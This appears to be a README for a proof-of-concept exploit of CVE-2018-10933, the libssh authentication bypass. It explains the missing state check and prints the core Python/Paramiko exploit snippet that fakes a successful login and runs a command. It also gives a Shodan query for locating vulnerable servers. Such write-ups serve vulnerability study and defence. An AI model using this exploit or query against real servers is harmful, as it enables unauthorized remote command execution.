# CVE-2018-10933
## LibSSH Authentication Bypass

A vulnerability was found in libssh's server-side state machine before versions 0.7.6 and 0.8.4. A malicious client could create channels without first performing authentication, resulting in unauthorized access.

## Some details
The issue comes from the way libssh doesn't maintain state for the authentication and how this can be used to bypass the authentication. Basically, think of the connection as a multi-step process: step1, step2, step3... Since libssh doesn't enforce the order of the steps, you can basically jump to step3 without going through step1 and step2.

Interestingly, the same issue was found in the SSH library Paramiko earlier: CVE-2018-7750.

Finally, this code is based on the example code examples/ssh_server_fork.c that requires to be "backdoored" to work properly as the actual code is keeping state...

## Exploiting this bug
There are plenty of exploits available in the wild, most of them rely on the Paramiko library and are very short. The most important part of the code looks something like:

```py
    sock = socket.socket()
    try:
        sock.connect((str(hostname), int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        cmd = transport.open_session()
        cmd.exec_command("uname")
```

You connect to the victim using a socket based on the hostname and port, then you wrap paramiko around the socket. Then, you can send the message telling the server that you are successfully authenticated. Finally, you can send the command you want to run (uname in the code above).

## Diagram 

//TODO: Add diagram of exploiting 

## Python version

ðŸ‘‰ [source code](./cve-2018-10933.py)

![image](https://user-images.githubusercontent.com/32587640/167353151-5b8d2793-512a-45d4-9c93-a4c2cfa47a5d.png)

## Vulnerable server fingerprints 

ðŸ‘‰ [Docs](https://gist.github.com/0x4D31/35ddb0322530414bbb4c3288292749cc)

## Shodan search 

```
product:libssh port:22,2222 ssh.hassh:489e30454fb8c5bdc15e54b24a80d109
```
